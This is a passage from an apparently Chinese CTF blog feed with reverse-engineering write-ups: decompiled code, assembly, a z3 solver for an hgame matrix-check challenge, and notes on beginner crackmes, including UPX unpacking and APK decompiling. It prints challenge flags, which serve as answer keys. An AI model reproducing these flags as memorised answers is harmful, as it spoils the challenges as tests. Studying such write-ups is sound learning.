  v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;110&lt;/span&gt;;
  v4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;119&lt;/span&gt;;
  v5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt;;
  v6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt;;
  v7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt;;
  v8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;67&lt;/span&gt;;
  v9 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;;
  v10 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;125&lt;/span&gt;;
  v53 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i )
  {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; j &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;j )
    {
      &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( k &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; k &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;k )
        &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v54 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v54 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; k &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;116&lt;/span&gt;)
                                            &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#ae81ff&#34;&gt;4LL&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v54 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;));&lt;span style=&#34;color:#75715e&#34;&gt;// 矩阵乘法
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    }
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( l &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; l &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;l )
  {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( m &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; m &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;m )
    {
      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v54 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; l &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v54 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; l &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;) )&lt;span style=&#34;color:#75715e&#34;&gt;// 与v11到v46比较
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        v53 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    }
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; v53;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;发现判断函数发生了变化&lt;/p&gt;
&lt;p&gt;第一个三重循环明显是一个矩阵乘法，第二个则是简单比较，由于这里指针有点绕，使用了gdb对每一项进行了判断&lt;/p&gt;
&lt;p&gt;首先在第二个循环打断点&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;.text:00000000004015FB loc_4015FB:                             ; CODE XREF: sub_401216+42E↓j
.text:00000000004015FB                 mov     edx, [rbp-14h]
.text:00000000004015FE                 mov     eax, edx
.text:0000000000401600                 add     eax, eax
.text:0000000000401602                 add     eax, edx
.text:0000000000401604                 add     eax, eax
.text:0000000000401606                 mov     edx, eax
.text:0000000000401608                 mov     eax, [rbp-18h]
.text:000000000040160B                 add     eax, edx
.text:000000000040160D                 cdqe
.text:000000000040160F                 mov     ecx, [rbp+rax*4-0B0h]
.text:0000000000401616                 mov     edx, [rbp-14h]
.text:0000000000401619                 mov     eax, edx
.text:000000000040161B                 add     eax, eax
.text:000000000040161D                 add     eax, edx
.text:000000000040161F                 add     eax, eax
.text:0000000000401621                 mov     edx, eax
.text:0000000000401623                 mov     eax, [rbp-18h]
.text:0000000000401626                 add     eax, edx
.text:0000000000401628                 cdqe
.text:000000000040162A                 mov     eax, [rbp+rax*4-140h]
.text:0000000000401631                 cmp     ecx, eax
.text:0000000000401633                 jz      short loc_40163C
.text:0000000000401635                 mov     dword ptr [rbp-4], 0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在cmp命令处打断点，查看ecx和eax寄存器的值，发现是拿计算结果和v11-v46进行比较&lt;/p&gt;
&lt;p&gt;随后查看第一个大循环，关键点显然是乘法&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;.text:000000000040159E                 imul    ecx, eax
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;打上断点后，发现是拿输入的6*6矩阵和104-125这段由36个数字构成的矩阵进行乘法&lt;/p&gt;
&lt;h3 id=&#34;step-4进行求解&#34;&gt;step 4：进行求解&lt;/h3&gt;
&lt;p&gt;所以接下来只需要求解矩阵即可，这里还是使用了z3&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; z3 &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;

s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Solver()

f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [ Int(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;) ]

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;):
    s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(f[i] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;)
    s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(f[i] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7f&lt;/span&gt;)

s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(f[ &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;h&amp;#39;&lt;/span&gt;))
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(f[ &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;g&amp;#39;&lt;/span&gt;))
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(f[ &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;))
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(f[ &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;m&amp;#39;&lt;/span&gt;))
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(f[ &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;e&amp;#39;&lt;/span&gt;))
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(f[ &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;{&amp;#39;&lt;/span&gt;))
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;}&amp;#39;&lt;/span&gt;))

a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;104&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;103&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;109&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;102&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;108&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;103&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;111&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;117&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;107&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;111&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;110&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;119&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;67&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;125&lt;/span&gt;]

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; a:
    print(chr(c), end&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
print()

ans &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;55030&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;61095&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;60151&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;57247&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;56780&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;55726&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;46642&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;52931&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;53580&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50437&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50062&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;44186&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;44909&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;46490&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;46024&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;44347&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;43850&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;44368&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;54990&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;61884&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;61202&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;58139&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;57730&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;54964&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;48849&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;51026&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;49629&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;48219&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;47904&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50823&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;46596&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50517&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;48421&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;46143&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;46102&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;46744&lt;/span&gt;]

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;):
        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; i] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a[j] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; j] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; j] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; j] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; j] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; j] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ans[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; j])

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;check() &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; sat:
    model &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;model()
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;):
        print (chr(model[f[i]]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;as_long()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;real), end&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)

print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;finish&amp;#39;&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# hgame{E@sy_Se1f-Modifying_C0oodee33}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Reverse from 0 to 1</title>
        <link>/post/reverse-from-0-to-1/</link>
        <pubDate>Fri, 15 Jan 2021 18:29:48 +0000</pubDate>
        
        <guid>/post/reverse-from-0-to-1/</guid>
        <description>&lt;img src="/post/reverse-from-0-to-1/cover.jpg" alt="Featured image of post Reverse from 0 to 1" /&gt;&lt;h2 id=&#34;内涵的软件&#34;&gt;内涵的软件&lt;/h2&gt;
&lt;p&gt;首先使用file命令，发现exe是32位的，将其拖入ida中&lt;/p&gt;
&lt;p&gt;进入main函数&lt;/p&gt;
&lt;p&gt;点击进入main0函数&lt;/p&gt;
&lt;p&gt;可以看到一串v2字符串&lt;/p&gt;
&lt;p&gt;结合程序运行时出现的文字：”这里本来应该是答案的“&lt;/p&gt;
&lt;p&gt;猜测v2就是答案&lt;/p&gt;
&lt;p&gt;直接提交&lt;/p&gt;
&lt;p&gt;发现不对&lt;/p&gt;
&lt;p&gt;将开头修改为flag&lt;/p&gt;
&lt;p&gt;提交后直接通过&lt;/p&gt;
&lt;h2 id=&#34;新年快乐&#34;&gt;新年快乐&lt;/h2&gt;
&lt;p&gt;首先使用file命令查看exe文件信息，发现是32位&lt;/p&gt;
&lt;p&gt;尝试运行发现是要求输入flag&lt;/p&gt;
&lt;p&gt;拖入ida进行静态分析&lt;/p&gt;
&lt;p&gt;发现只有一个start函数，ida各种报错，无法分析&lt;/p&gt;
&lt;p&gt;猜测使用了upx壳&lt;/p&gt;
&lt;p&gt;使用exeinfope软件进行查看，upx壳实锤&lt;/p&gt;
&lt;p&gt;脱壳后再次拖入ida&lt;/p&gt;
&lt;p&gt;发现v4为&amp;quot;HappyNewYear!&amp;quot;&lt;/p&gt;
&lt;p&gt;对于输入v5，直接与v4进行strncmp的比较&lt;/p&gt;
&lt;p&gt;因此只需要与v4相同即可&lt;/p&gt;
&lt;p&gt;尝试后发现没问题&lt;/p&gt;
&lt;p&gt;套上flag提交&lt;/p&gt;
&lt;p&gt;成功&lt;/p&gt;
&lt;h2 id=&#34;guessgame&#34;&gt;guessgame&lt;/h2&gt;
&lt;p&gt;使用软件，发现是一个猜数游戏&lt;/p&gt;
&lt;p&gt;拖入ida分析&lt;/p&gt;
&lt;p&gt;发现整个代码与flag没有任何关系，就是一个猜测随机数的游戏&lt;/p&gt;
&lt;p&gt;于是猜测flag隐藏在字符串常量中&lt;/p&gt;
&lt;p&gt;进入字符串常量最顶部，发现如下字符串：&lt;/p&gt;
&lt;p&gt;BJD{S1mple_ReV3r5e_W1th_0D_0r_IDA}&lt;/p&gt;
&lt;p&gt;即为flag&lt;/p&gt;
&lt;h2 id=&#34;helloword&#34;&gt;helloword&lt;/h2&gt;
&lt;p&gt;下载后发现是apk文件&lt;/p&gt;
&lt;p&gt;首先将apk后缀更改为zip&lt;/p&gt;
&lt;p&gt;解压后发现文件夹中含有一个classes.dex文件&lt;/p&gt;
&lt;p&gt;使用dex2jar软件将其转换为jar文件&lt;/p&gt;
